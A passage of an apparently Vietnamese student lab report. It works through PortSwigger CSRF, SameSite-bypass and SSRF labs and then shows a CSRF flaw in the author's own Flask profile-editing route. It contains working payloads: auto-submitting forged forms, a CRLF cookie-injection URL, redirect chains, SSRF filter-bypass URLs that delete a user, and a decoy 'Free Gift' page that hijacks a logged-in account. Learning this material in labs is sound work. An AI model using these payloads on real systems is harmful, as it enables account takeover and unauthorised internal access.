- **Không ngăn chặn toàn bộ SSRF**: Nếu ứng dụng chính vẫn có lỗ hổng SSRF, hacker có thể lợi dụng để gửi request đến các hệ thống khác ngoài kiểm soát của nội bộ.


# 2. Thực hành

## 2.1 Vượt qua các thử thách 

### **CSRF**

##### 1. CSRF trong đó xác thực mã thông báo phụ thuộc vào phương thức yêu cầu

**Lý thuyết:**

**Xác thực mã thông báo CSRF phụ thuộc vào phương thức yêu cầu**

- Một số ứng dụng xác thực đúng mã thông báo khi yêu cầu sử dụng phương thức POST nhưng bỏ qua xác thực khi sử dụng phương thức GET.

- Trong tình huống này, kẻ tấn công có thể chuyển sang phương thức GET để bỏ qua xác thực và thực hiện cuộc tấn công CSRF:

**Giải pháp:**

1. Mở trình duyệt Burp và đăng nhập vào tài khoản của bạn. Gửi biểu mẫu "Cập nhật email" và tìm yêu cầu kết quả trong lịch sử Proxy của bạn.
2. Gửi yêu cầu đến Burp Repeater và quan sát xem nếu bạn thay đổi giá trị của `csrf`tham số thì yêu cầu sẽ bị từ chối.
3. Sử dụng "Thay đổi phương thức yêu cầu" trên menu ngữ cảnh để chuyển đổi thành yêu cầu GET và quan sát thấy mã thông báo CSRF không còn được xác minh nữa.
4. Nếu bạn đang sử dụng Burp Suite Professional, hãy nhấp chuột phải vào yêu cầu và từ menu ngữ cảnh, hãy chọn Công cụ tương tác / Tạo CSRF PoC. Bật tùy chọn để bao gồm tập lệnh tự động gửi và nhấp vào "Tạo lại".
    
    Ngoài ra, nếu bạn đang sử dụng Burp Suite Community Edition, hãy sử dụng mẫu HTML sau. Bạn có thể lấy URL yêu cầu bằng cách nhấp chuột phải và chọn "Sao chép URL".
```js
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="anything%40web-security-academy.net"> 
</form> 
<script> 
	document.forms[0].submit(); 
</script>
```
5. Truy cập máy chủ khai thác, dán mã HTML khai thác vào phần "Nội dung" và nhấp vào "Lưu trữ".
6. Để xác minh xem lỗ hổng có hoạt động hay không, hãy tự mình thử bằng cách nhấp vào "Xem lỗ hổng" và kiểm tra yêu cầu và phản hồi HTTP kết quả.
7. Thay đổi địa chỉ email trong phần khai thác sao cho nó không trùng với địa chỉ email của bạn.
8. Lưu trữ lỗ hổng, sau đó nhấp vào "Gửi cho nạn nhân" để giải quyết phòng thí nghiệm.

**Kết quả:**
![5](https://github.com/user-attachments/assets/cd57d9d3-9045-49cc-bf0c-8e640c8253ff)

![6](https://github.com/user-attachments/assets/b5ca56c7-e0b9-47a9-bdb8-b5cdc199370c)

![7](https://github.com/user-attachments/assets/d6c3a1fd-cb27-4dac-b5d8-68b0d6d40d99)


##### 2. CSRF trong đó xác thực mã thông báo phụ thuộc vào sự hiện diện của mã thông báo

**Lý thuyết:**

**Xác thực mã thông báo CSRF phụ thuộc vào sự hiện diện của mã thông báo**

- Một số ứng dụng xác thực đúng mã thông báo khi có mã thông báo nhưng bỏ qua bước xác thực nếu mã thông báo bị bỏ sót.

- Trong tình huống này, kẻ tấn công có thể xóa toàn bộ tham số chứa mã thông báo (không chỉ giá trị của nó) để bỏ qua xác thực và thực hiện cuộc tấn công CSRF:

**Giải pháp:**

1. Mở trình duyệt Burp và đăng nhập vào tài khoản của bạn. Gửi biểu mẫu "Cập nhật email" và tìm yêu cầu kết quả trong lịch sử Proxy của bạn.
2. Gửi yêu cầu đến Burp Repeater và quan sát xem nếu bạn thay đổi giá trị của `csrf`tham số thì yêu cầu sẽ bị từ chối.
3. Xóa `csrf`hoàn toàn tham số và quan sát xem yêu cầu hiện đã được chấp nhận.
4. Nếu bạn đang sử dụng Burp Suite Professional, hãy nhấp chuột phải vào yêu cầu và từ menu ngữ cảnh, hãy chọn Công cụ tương tác / Tạo CSRF PoC. Bật tùy chọn để bao gồm tập lệnh tự động gửi và nhấp vào "Tạo lại".
    
    Ngoài ra, nếu bạn đang sử dụng Burp Suite Community Edition, hãy sử dụng mẫu HTML sau. Bạn có thể lấy URL yêu cầu bằng cách nhấp chuột phải và chọn "Sao chép URL".
```js
<form method="POST" action="https://0a8300aa03d17ad38062121d0072004f.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@example.com"> 
</form>
<script>
    document.forms[0].submit();
</script>
```

5. Truy cập máy chủ khai thác, dán mã HTML khai thác vào phần "Nội dung" và nhấp vào "Lưu trữ".
6. Để xác minh xem lỗ hổng có hoạt động hay không, hãy tự mình thử bằng cách nhấp vào "Xem lỗ hổng" và kiểm tra yêu cầu và phản hồi HTTP kết quả.
7. Thay đổi địa chỉ email trong phần khai thác sao cho nó không trùng với địa chỉ email của bạn.
8. Lưu trữ lỗ hổng, sau đó nhấp vào "Gửi cho nạn nhân" để giải quyết phòng thí nghiệm.

**Kết quả:**

![8](https://github.com/user-attachments/assets/35190ed9-d8fb-40b3-914a-980a2e6b05c7)

![9](https://github.com/user-attachments/assets/ceddc5bd-aecf-453b-8afd-bd3a04baa0e0)

![10](https://github.com/user-attachments/assets/e5b7d07f-b92b-4d68-aa8e-9580292603de)

##### 3. CSRF nơi mã thông báo không được liên kết với phiên người dùng

**Lý thuyết:**

**Mã thông báo CSRF không được liên kết với phiên người dùng**

- Một số ứng dụng không xác thực rằng mã thông báo thuộc về cùng một phiên với người dùng đang thực hiện yêu cầu. Thay vào đó, ứng dụng duy trì một nhóm mã thông báo toàn cầu mà nó đã phát hành và chấp nhận bất kỳ mã thông báo nào xuất hiện trong nhóm này.

- Trong tình huống này, kẻ tấn công có thể đăng nhập vào ứng dụng bằng tài khoản của mình, lấy mã thông báo hợp lệ, sau đó cung cấp mã thông báo đó cho người dùng nạn nhân trong cuộc tấn công CSRF.

**Giải pháp:**
1. Mở trình duyệt Burp và đăng nhập vào tài khoản của bạn. Gửi biểu mẫu "Cập nhật email" và chặn yêu cầu kết quả.
2. Ghi lại giá trị của mã thông báo CSRF, sau đó hủy yêu cầu.
3. Mở cửa sổ trình duyệt riêng tư/ẩn danh, đăng nhập vào tài khoản khác của bạn và gửi yêu cầu cập nhật qua email tới Burp Repeater.
4. Lưu ý rằng nếu bạn hoán đổi mã thông báo CSRF với giá trị từ tài khoản khác thì yêu cầu sẽ được chấp nhận.
5. Tạo và lưu trữ một bằng chứng khai thác khái niệm như được mô tả trong giải pháp cho [lỗ hổng CSRF không có](https://portswigger.net/web-security/csrf/lab-no-defenses) phòng thí nghiệm phòng thủ. Lưu ý rằng mã thông báo CSRF chỉ sử dụng một lần, vì vậy bạn sẽ cần phải đưa vào một mã thông báo mới.
6. Thay đổi địa chỉ email trong phần khai thác sao cho nó không trùng với địa chỉ email của bạn.
7. Lưu trữ lỗ hổng, sau đó nhấp vào "Gửi cho nạn nhân" để giải quyết phòng thí nghiệm.

**Kết quả:**

![11](https://github.com/user-attachments/assets/e38bd50d-e3c2-400e-9ee0-f30c19d30afa)

![12](https://github.com/user-attachments/assets/4a45f089-fe8d-44eb-a809-6a71ad7083da)

##### 4. CSRF trong đó mã thông báo được liên kết với cookie không phải phiên

**Lý thuyết:**

**Mã thông báo CSRF được liên kết với cookie không phải phiên**

- Trong một biến thể của lỗ hổng trước đó, một số ứng dụng liên kết mã thông báo CSRF với cookie, nhưng không phải với cùng một cookie được sử dụng để theo dõi phiên. Điều này có thể dễ dàng xảy ra khi một ứng dụng sử dụng hai khuôn khổ khác nhau, một để xử lý phiên và một để bảo vệ CSRF, không được tích hợp với nhau
- Tình huống này khó khai thác hơn nhưng vẫn dễ bị tấn công. Nếu trang web có bất kỳ hành vi nào cho phép kẻ tấn công đặt cookie trong trình duyệt của nạn nhân, thì có thể xảy ra tấn công. Kẻ tấn công có thể đăng nhập vào ứng dụng bằng tài khoản của riêng họ, lấy mã thông báo hợp lệ và cookie liên quan, tận dụng hành vi đặt cookie để đặt cookie của họ vào trình duyệt của nạn nhân và cung cấp mã thông báo của họ cho nạn nhân trong cuộc tấn công CSRF của họ.

**Giải pháp:**

1. Mở trình duyệt Burp và đăng nhập vào tài khoản của bạn. Gửi biểu mẫu "Cập nhật email" và tìm yêu cầu kết quả trong lịch sử Proxy của bạn.
2. Gửi yêu cầu đến Burp Repeater và quan sát rằng việc thay đổi `session`cookie sẽ đăng xuất bạn, nhưng việc thay đổi `csrfKey`cookie chỉ khiến mã thông báo CSRF bị từ chối. Điều này cho thấy `csrfKey`cookie có thể không được liên kết chặt chẽ với phiên.
3. Mở cửa sổ trình duyệt riêng tư/ẩn danh, đăng nhập vào tài khoản khác của bạn và gửi yêu cầu cập nhật qua email mới vào Burp Repeater.
4. Lưu ý rằng nếu bạn hoán đổi `csrfKey`cookie và `csrf`tham số từ tài khoản đầu tiên sang tài khoản thứ hai, yêu cầu sẽ được chấp nhận.
5. Đóng tab Repeater và trình duyệt ẩn danh.
6. Quay lại trình duyệt gốc, thực hiện tìm kiếm, gửi yêu cầu kết quả đến Burp Repeater và quan sát thuật ngữ tìm kiếm được phản ánh trong tiêu đề Set-Cookie. Vì chức năng tìm kiếm không có bảo vệ CSRF, bạn có thể sử dụng chức năng này để đưa cookie vào trình duyệt của người dùng nạn nhân.
7. Tạo một URL sử dụng lỗ hổng này để đưa `csrfKey`cookie của bạn vào trình duyệt của nạn nhân:
```js
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```
8. Tạo và lưu trữ một bằng chứng khai thác khái niệm như được mô tả trong giải pháp cho [lỗ hổng CSRF không có](https://portswigger.net/web-security/csrf/lab-no-defenses) phòng thí nghiệm phòng thủ, đảm bảo rằng bạn bao gồm mã thông báo CSRF của mình. Khai thác phải được tạo từ yêu cầu thay đổi email.
9. Xóa `<script>`khối tự động gửi và thay vào đó thêm mã sau để đưa cookie vào:
```js
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
10. Thay đổi địa chỉ email trong phần khai thác sao cho nó không trùng với địa chỉ email của bạn.
11. Lưu trữ lỗ hổng, sau đó nhấp vào "Gửi cho nạn nhân" để giải quyết phòng thí nghiệm.

**Kết quả:**

![13](https://github.com/user-attachments/assets/8c196517-af90-4812-8b4e-3c1e36c76d95)

![14](https://github.com/user-attachments/assets/2dab073f-e8ba-4a7b-ab5e-ec45b4a8f8a2)

##### 5. Bỏ qua SameSite Lax thông qua phương pháp ghi đè

Trên thực tế, máy chủ không phải lúc nào cũng cầu kỳ về việc chúng có nhận được yêu cầu `GET`hay không `POST`đến một điểm cuối nhất định, ngay cả những máy chủ đang mong đợi một biểu mẫu được gửi. Nếu chúng cũng sử dụng `Lax`các hạn chế cho cookie phiên của chúng, dù là rõ ràng hay do mặc định của trình duyệt, bạn vẫn có thể thực hiện một cuộc tấn công CSRF bằng cách đưa ra `GET`yêu cầu từ trình duyệt của nạn nhân.

Miễn là yêu cầu liên quan đến điều hướng cấp cao nhất, trình duyệt vẫn sẽ bao gồm cookie phiên của nạn nhân. Sau đây là một trong những cách tiếp cận đơn giản nhất để khởi chạy một cuộc tấn công như vậy:
```js
<script> 
document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000'; 
</script>
```

Ngay cả khi `GET`yêu cầu thông thường không được phép, một số khung cung cấp cách ghi đè phương thức được chỉ định trong dòng yêu cầu. Ví dụ, Symfony hỗ trợ `_method`tham số trong biểu mẫu, được ưu tiên hơn phương thức thông thường cho mục đích định tuyến:

```js
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST"> 
	<input type="hidden" name="_method" value="GET"> 
	<input type="hidden" name="recipient" value="hacker"> 
	<input type="hidden" name="amount" value="1000000"> 
</form>
```
Các khuôn khổ khác hỗ trợ nhiều tham số tương tự.

**Giải pháp:**

1. Gửi `POST /my-account/change-email`yêu cầu tới Burp Repeater.
    
2. Trong Burp Repeater, nhấp chuột phải vào yêu cầu và chọn **Thay đổi phương thức yêu cầu** . Burp tự động tạo một `GET`yêu cầu tương đương.
    
3. Gửi yêu cầu. Lưu ý rằng điểm cuối chỉ cho phép `POST`yêu cầu.
    
4. Hãy thử ghi đè phương thức bằng cách thêm `_method`tham số vào chuỗi truy vấn:
```js
GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1
```
5. Gửi yêu cầu. Lưu ý rằng yêu cầu này có vẻ đã được máy chủ chấp nhận.
    
6. Trong trình duyệt, hãy vào trang tài khoản của bạn và xác nhận rằng địa chỉ email của bạn đã thay đổi.

**Kết quả:**

![15](https://github.com/user-attachments/assets/7e762044-0618-4a66-ae53-7818895e9ed3)

![16](https://github.com/user-attachments/assets/0880ee4a-13c7-40c7-9e0d-e02b4aa4ab08)

##### 6. Bỏ qua SameSite Strict thông qua chuyển hướng phía máy khách

**Giải pháp:**

##### Nghiên cứu chức năng thay đổi email

1. Trong trình duyệt Burp, hãy đăng nhập vào tài khoản của bạn và thay đổi địa chỉ email.
    
2. Trong Burp, hãy chuyển đến tab **Proxy > Lịch sử HTTP** .
    
3. Nghiên cứu `POST /my-account/change-email`yêu cầu và lưu ý rằng yêu cầu này không chứa bất kỳ mã thông báo không thể đoán trước nào, do đó có thể dễ bị CSRF nếu bạn có thể bỏ qua bất kỳ hạn chế cookie SameSite nào.
    
4. Hãy xem phản hồi cho `POST /login`yêu cầu của bạn. Lưu ý rằng trang web chỉ định rõ ràng `SameSite=Strict`khi thiết lập cookie phiên. Điều này ngăn trình duyệt đưa các cookie này vào yêu cầu liên trang web.
    

##### Xác định một tiện ích phù hợp

1. Trong trình duyệt, hãy đến một trong các bài đăng trên blog và đăng một bình luận tùy ý. Lưu ý rằng ban đầu bạn được chuyển đến trang xác nhận tại `/post/comment/confirmation?postId=x`nhưng sau vài giây, bạn sẽ được đưa trở lại bài đăng trên blog.
    
2. Trong Burp, hãy vào lịch sử proxy và lưu ý rằng chuyển hướng này được xử lý ở phía máy khách bằng cách sử dụng tệp JavaScript đã nhập `/resources/js/commentConfirmationRedirect.js`.
    
3. Nghiên cứu JavaScript và lưu ý rằng nó sử dụng `postId`tham số truy vấn để xây dựng đường dẫn động cho chuyển hướng phía máy khách.
    
4. Trong lịch sử proxy, nhấp chuột phải vào `GET /post/comment/confirmation?postId=x`yêu cầu và chọn Sao **chép URL** .
    
5. Trong trình duyệt, hãy truy cập URL này nhưng hãy thay đổi `postId`tham số thành một chuỗi tùy ý.
```js
/post/comment/confirmation?postId=foo
```

6. Lưu ý rằng ban đầu bạn sẽ thấy trang xác nhận bài đăng trước khi JavaScript phía máy khách cố gắng chuyển hướng bạn đến đường dẫn chứa chuỗi đã chèn của bạn, ví dụ: `/post/foo`.
    
7. Hãy thử chèn một chuỗi đường dẫn chuyển hướng để URL chuyển hướng được xây dựng động sẽ trỏ đến trang tài khoản của bạn:
```js
/post/comment/confirmation?postId=1/../../my-account
```

8. Lưu ý rằng trình duyệt chuẩn hóa URL này và đưa bạn đến trang tài khoản của mình thành công. Điều này xác nhận rằng bạn có thể sử dụng `postId`tham số để tạo `GET`yêu cầu cho điểm cuối tùy ý trên trang web mục tiêu.
    

##### Bỏ qua các hạn chế của SameSite

1. Trong trình duyệt, hãy đến máy chủ khai thác và tạo một tập lệnh khiến trình duyệt của người xem gửi `GET`yêu cầu mà bạn vừa kiểm tra. Sau đây là một cách tiếp cận khả thi:
```js
<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account"; </script>
```

2. Tự lưu trữ và xem bản khai thác.
    
3. Lưu ý rằng khi chuyển hướng phía máy khách diễn ra, bạn vẫn kết thúc ở trang tài khoản đã đăng nhập của mình. Điều này xác nhận rằng trình duyệt đã bao gồm cookie phiên đã xác thực của bạn trong yêu cầu thứ hai, mặc dù yêu cầu gửi bình luận ban đầu được khởi tạo từ một trang web bên ngoài tùy ý.
    

##### Tạo ra một khai thác

1. Gửi `POST /my-account/change-email`yêu cầu tới Burp Repeater.
    
2. Trong Burp Repeater, nhấp chuột phải vào yêu cầu và chọn **Thay đổi phương thức yêu cầu** . Burp tự động tạo một `GET`yêu cầu tương đương.
    
3. Gửi yêu cầu. Lưu ý rằng điểm cuối cho phép bạn thay đổi địa chỉ email bằng cách sử dụng `GET`yêu cầu.
    
4. Quay lại máy chủ khai thác và thay đổi `postId`tham số trong khai thác của bạn để lệnh chuyển hướng khiến trình duyệt gửi `GET`yêu cầu tương đương để thay đổi địa chỉ email của bạn:
    Lưu ý rằng bạn cần bao gồm `submit`tham số và URL mã hóa dấu phân cách dấu & để tránh làm hỏng tham `postId`số trong yêu cầu thiết lập ban đầu.
```js
<script> 
document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1"; 
</script>
```
    
5. Hãy tự mình kiểm tra lỗ hổng và xác nhận rằng bạn đã thay đổi địa chỉ email thành công.
    
6. Thay đổi địa chỉ email trong phần khai thác sao cho nó không trùng với địa chỉ email của bạn.
    
7. Gửi mã khai thác cho nạn nhân. Sau vài giây, phòng thí nghiệm sẽ được giải quyết.

Các payload dung để thay đổi gamil
```js
payload 1: /post/comment/confirmation?postId=8

payload 2: /post/comment/confirmation?postId=../my-account/

payload 3: /post/comment/confirmation?postId=../my-account/change-email?email=test1%40gamil.com%26submit=1

#gửi cho nạn nhân
payload 4: 
<script>
	window.location="https://0a080013044921498019170c0093007f.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=hacker%40gamil.com%26submit=1"
</script>
```

**Kết quả:**

![17](https://github.com/user-attachments/assets/b29584f4-21d8-41f3-8fcc-e5541ff8fa5b)

## **SSRF**

##### 1. SSRF cơ bản đối với máy chủ cục bộ

**Giải pháp:**

1. Duyệt đến `/admin`và quan sát thấy bạn không thể truy cập trực tiếp vào trang quản trị.
2. Truy cập sản phẩm, nhấp vào "Kiểm tra kho", chặn yêu cầu trong Burp Suite và gửi đến Burp Repeater.
3. Thay đổi URL trong `stockApi`tham số thành `http://localhost/admin`. Điều này sẽ hiển thị giao diện quản trị.
4. Đọc HTML để xác định URL cần xóa người dùng mục tiêu, đó là:
    
    `http://localhost/admin/delete?username=carlos`
5. Gửi URL này trong `stockApi`tham số để thực hiện cuộc tấn công SSRF.

**Kết quả:**

![18](https://github.com/user-attachments/assets/e08d4b37-2273-4e5e-82f8-6f6e07263bbf)

##### 2. SSRF cơ bản so với hệ thống phụ trợ khác

**Giải pháp:**

1. Truy cập sản phẩm, nhấp vào **Kiểm tra kho** , chặn yêu cầu trong Burp Suite và gửi đến Burp Intruder.
2. Thay đổi `stockApi`tham số để `http://192.168.0.1:8080/admin`tô sáng octet cuối cùng của địa chỉ IP (số `1`) và nhấp vào **Thêm §** .
3. Trong bảng **điều khiển bên Tải trọng** , hãy thay đổi loại tải trọng thành **Số** và nhập 1, 255 và 1 vào các hộp **Từ** , **Đến** và **Bước** tương ứng.
4. Nhấp chuột**Bắt đầu tấn công** .
5. Nhấp vào cột **Trạng thái** để sắp xếp theo mã trạng thái tăng dần. Bạn sẽ thấy một mục duy nhất có trạng thái là `200`, hiển thị giao diện quản trị.
6. Nhấp vào yêu cầu này, gửi đến Burp Repeater và thay đổi đường dẫn trong `stockApi`phần:`/admin/delete?username=carlos`

**Kết quả:**

![19](https://github.com/user-attachments/assets/4102390a-a371-4931-853f-3c5bed212808)

![20](https://github.com/user-attachments/assets/fe9b800e-12ce-4a98-86f3-182e63d1f8bb)

##### 3. SSRF với bộ lọc đầu vào dựa trên danh sách đen

**Giải pháp:**

1. Truy cập sản phẩm, nhấp vào "Kiểm tra kho", chặn yêu cầu trong Burp Suite và gửi đến Burp Repeater.
2. Thay đổi URL trong `stockApi`tham số thành `http://127.0.0.1/`và quan sát xem yêu cầu có bị chặn không.
3. Bỏ qua lệnh chặn bằng cách thay đổi URL thành:`http://127.1/`
4. Thay đổi URL thành `http://127.1/admin`và thấy URL lại bị chặn.
5. Làm tối nghĩa "a" bằng cách mã hóa URL kép thành %2561 để truy cập giao diện quản trị và xóa người dùng mục tiêu.

**Kết quả:**

![21](https://github.com/user-attachments/assets/ee9dfab2-d566-44f8-a056-b7041936d026)

![22](https://github.com/user-attachments/assets/7026a626-2047-46ec-b7ed-ca25f8f64745)

![23](https://github.com/user-attachments/assets/21a76048-eae0-4365-858b-ee91ab876b67)

##### 4. SSRF với bộ lọc đầu vào dựa trên danh sách trắng

**Giải pháp:**

1. Truy cập sản phẩm, nhấp vào "Kiểm tra kho", chặn yêu cầu trong Burp Suite và gửi đến Burp Repeater.
2. Thay đổi URL trong `stockApi`tham số thành `http://127.0.0.1/`và quan sát ứng dụng đang phân tích cú pháp URL, trích xuất tên máy chủ và xác thực nó với danh sách trắng.
3. Thay đổi URL thành `http://username@stock.weliketoshop.net/`và quan sát xem điều này có được chấp nhận hay không, điều này cho biết trình phân tích URL hỗ trợ thông tin xác thực được nhúng.
4. Thêm a `#`vào tên người dùng và quan sát thấy URL hiện đã bị từ chối.
5. `#`Mã hóa URL kép `%2523`và quan sát phản hồi "Lỗi máy chủ nội bộ" cực kỳ đáng ngờ, cho biết máy chủ có thể đã cố gắng kết nối với "tên người dùng".
6. Để truy cập giao diện quản trị và xóa người dùng mục tiêu, hãy thay đổi URL thành:
```js
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

**Kết quả:**

![24](https://github.com/user-attachments/assets/86111ceb-ac12-4323-917b-0c3bd96b6376)

![25](https://github.com/user-attachments/assets/4863ac67-1e4b-4a02-9cc8-8e49297695ee)

![26](https://github.com/user-attachments/assets/4f1762a4-aa82-4f97-b49b-75b7933acb21)

![27](https://github.com/user-attachments/assets/7e0eb6bb-78c7-4220-8f53-1738290378b3)

##### 5. SSRF với bộ lọc bỏ qua thông qua lỗ hổng chuyển hướng mở

**Lý thuyết:**

**Bỏ qua bộ lọc SSRF thông qua chuyển hướng mở**

- Đôi khi có thể vượt qua các biện pháp phòng thủ dựa trên bộ lọc bằng cách khai thác lỗ hổng chuyển hướng mở.

- Trong ví dụ trước, hãy tưởng tượng URL do người dùng gửi được xác thực nghiêm ngặt để ngăn chặn việc khai thác hành vi SSRF có chủ đích. Tuy nhiên, ứng dụng có URL được phép chứa lỗ hổng chuyển hướng mở. Với điều kiện API được sử dụng để thực hiện yêu cầu HTTP ở phía sau hỗ trợ chuyển hướng, bạn có thể xây dựng một URL đáp ứng bộ lọc và dẫn đến yêu cầu được chuyển hướng đến mục tiêu phía sau mong muốn.

Ví dụ, ứng dụng có lỗ hổng chuyển hướng mở trong đó URL sau:
```js
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```

trả về một chuyển hướng tới:
```js
http://evil-user.net
```

Bạn có thể tận dụng lỗ hổng chuyển hướng mở để bỏ qua bộ lọc URL và khai thác lỗ hổng SSRF như sau:
```js
POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

Khai thác SSRF này hoạt động vì ứng dụng đầu tiên xác thực rằng `stockAPI`URL được cung cấp nằm trên một miền được phép, và đúng là như vậy. Sau đó, ứng dụng yêu cầu URL được cung cấp, kích hoạt chuyển hướng mở. Nó theo chuyển hướng và thực hiện yêu cầu đến URL nội bộ do kẻ tấn công lựa chọn.

**Giải pháp:**
1. Truy cập sản phẩm, nhấp vào "Kiểm tra kho", chặn yêu cầu trong Burp Suite và gửi đến Burp Repeater.
2. Hãy thử thay đổi `stockApi`tham số và quan sát rằng không thể khiến máy chủ gửi yêu cầu trực tiếp đến một máy chủ khác.
3. Nhấp vào "sản phẩm tiếp theo" và quan sát tham `path`số được đặt vào tiêu đề Vị trí của phản hồi chuyển hướng, dẫn đến chuyển hướng mở.
4. Tạo một URL khai thác lỗ hổng chuyển hướng mở và chuyển hướng đến giao diện quản trị, sau đó đưa thông tin này vào `stockApi`tham số trên trình kiểm tra kho:
```js
/product/nextProduct?path=http://192.168.0.12:8080/admin
```
5. Lưu ý rằng trình kiểm tra kho sẽ theo dõi chuyển hướng và hiển thị cho bạn trang quản trị.
6. Sửa đổi đường dẫn để xóa người dùng mục tiêu:
```js
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

![28](https://github.com/user-attachments/assets/025b7d79-550f-4b02-84f7-ef3e427e28a5)

![29](https://github.com/user-attachments/assets/1274397b-9620-41a3-87ed-0b3f6b72a8ad)

## 2.2 Lỗi CSRF trong website ở challenge trước

### **Phát hiện lỗ hổng**

Tôi đã phát hiện lỗi này ở phần thay đổi thông tin cá nhân của người dùng. Tôi thấy những lỗi sau có thể dẫn đến tấn công CSRF

- API `/edit_profile` **sử dụng phương thức POST**, đây là kiểu tấn công CSRF phổ biến (form ẩn có thể tự động gửi request mà không cần người dùng biết).
- Không có **CSRF token**, tức là không có gì xác nhận rằng request đến từ một trang web hợp lệ.
- Không kiểm tra **Origin** hoặc **Referer**, nên có thể bị khai thác qua trang web giả mạo.
- **Form chỉ dựa vào session** → Nếu người dùng đã đăng nhập, trình duyệt sẽ tự động gửi cookie session khi nạn nhân truy cập trang giả mạo.

**Code thay đổi thông tin cá nhân**
```js
@app.route('/edit_profile', methods=['GET', 'POST'])  
def edit_profile():  
    if 'student_username' not in session:  # Kiểm tra session để đảm bảo người dùng đã đăng nhập  
        flash("You must be logged in to edit your profile.", 'warning')  
        return redirect(url_for('login'))  
  
    try:  
        # Kết nối cơ sở dữ liệu  
        conn = get_db_connection()  
        cursor = conn.cursor(dictionary=True)  
  
        # Lấy thông tin sinh viên từ cơ sở dữ liệu dựa trên session  
        cursor.execute("SELECT * FROM students WHERE username = %s", (session['student_username'],))  
        student = cursor.fetchone()  
  
        if not student:  # Xử lý nếu không tìm thấy sinh viên  
            flash("Student not found.", 'danger')  
            return redirect(url_for('login'))  
  
        # Nếu nhận được yêu cầu POST (người dùng gửi form để cập nhật thông tin)  
        if request.method == 'POST':  
            fullname = request.form.get('fullname', student.get('fullname'))  # Giữ nguyên nếu không có input  
            email = request.form.get('email', student.get('email'))  
            phone = request.form.get('phone', student.get('phone'))  
            password = request.form.get('password')  # Mật khẩu mới (nếu có)  
  
            # Kiểm tra và xử lý cập nhật mật khẩu nếu được nhập            
            if password and password.strip():  # Chỉ xử lý nếu mật khẩu không rỗng  
                hashed_password = generate_password_hash(password)  
                cursor.execute(  
                    """  
                    UPDATE students                    
                    SET fullname = %s, email = %s, phone = %s, password = %s   
                    WHERE username = %s  
                    """,  
                    (fullname, email, phone, hashed_password, session['student_username'])  
                )  
            else:  
                # Cập nhật thông tin bình thường (không thay đổi mật khẩu)  
                cursor.execute(  
                    """  
                    UPDATE students                    
                    SET fullname = %s, email = %s, phone = %s   
                    WHERE username = %s  
                    """,  
                    (fullname, email, phone, session['student_username'])  
                )  
  
            # Lưu thay đổi vào cơ sở dữ liệu  
            conn.commit()  
            flash("Profile updated successfully!", 'success')  
  
            # Cập nhật lại session để đồng bộ thông tin mới  
            session['fullname'] = fullname  
            session['email'] = email  
            session['phone'] = phone  
  
            # Chuyển hướng về dashboard sinh viên sau khi hoàn tất  
            return redirect(url_for('student_dashboard', id=session.get('student_id')))  
  
        # Render form chỉnh sửa thông tin, đưa dữ liệu hiện tại của sinh viên lên form  
        return render_template('edit_profile.html', student=student)  
  
    except Exception as e:  
        # Xử lý lỗi (ghi log hoặc hiển thị thông báo)  
        flash(f"An error occurred while processing: {e}", 'danger')  
        return redirect(url_for('student_dashboard'))  
  
    finally:  
        # Đóng cursor và kết nối cơ sở dữ liệu  
        if cursor:  
            cursor.close()  
        if conn:  
            conn.close()
```

**HTML**
```js
<!DOCTYPE html>  
<html lang="en">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>Edit Profile</title>  
</head>  
<body>  
    <h2>Edit Profile</h2>  
    <form method="POST">  
        <label for="fullname">Fullname:</label>  
        <input type="text" id="fullname" name="fullname" value="{{ student.fullname }}" required><br><br>  
  
        <label for="email">Email:</label>  
        <input type="email" id="email" name="email" value="{{ student.email }}" required><br><br>  
  
        <label for="phone">Phone:</label>  
        <input type="text" id="phone" name="phone" value="{{ student.phone }}" required><br><br>  
  
        <label for="password">New Password (optional):</label>  
        <input type="password" id="password" name="password"><br><br>  
  
        <button type="submit">Update</button>  
    </form></body>  
</html>
```

### **Kẻ tấn công có thể thực hiện các bước như sau để tấn công CSRF**

##### Bước 1: Kẻ tấn công tạo trang HTML giả mạo

```js
<!DOCTYPE html>  
<html lang="en">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>Free Gift</title>  
</head>  
<body onload="document.forms[0].submit()">  
    <h1>Click vào đây để nhận phần thưởng miễn phí!</h1>  
    <form action="http://172.0.0.1:5000/edit_profile" method="POST">  
        <input type="hidden" name="fullname" value="Hacked Account">  
        <input type="hidden" name="email" value="hacker@example.com">  
        <input type="hidden" name="phone" value="123456789">  
        <input type="hidden" name="password" value="newpassword123">  
        <input type="submit" value="Click here">  
    </form></body>  
</html>
```
- Khi nạn nhân **truy cập trang này**, trình duyệt của họ sẽ **tự động gửi form POST đến trang `/edit_profile`** của ứng dụng web mục tiêu.
- Do nạn nhân đã **đăng nhập sẵn**, trình duyệt sẽ tự động gửi **cookie session hợp lệ**.
- Máy chủ xử lý yêu cầu **mà không có CSRF Token**, dẫn đến **tài khoản của nạn nhân bị thay đổi thông tin theo ý kẻ tấn công**.

**Cuộc lừa đảo đang được diễn ra**

![30](https://github.com/user-attachments/assets/442ef5c5-864a-4139-808b-60efd971dfc6)

##### Bước 2: Dụ nạn nhân truy cập trang web giả mạo

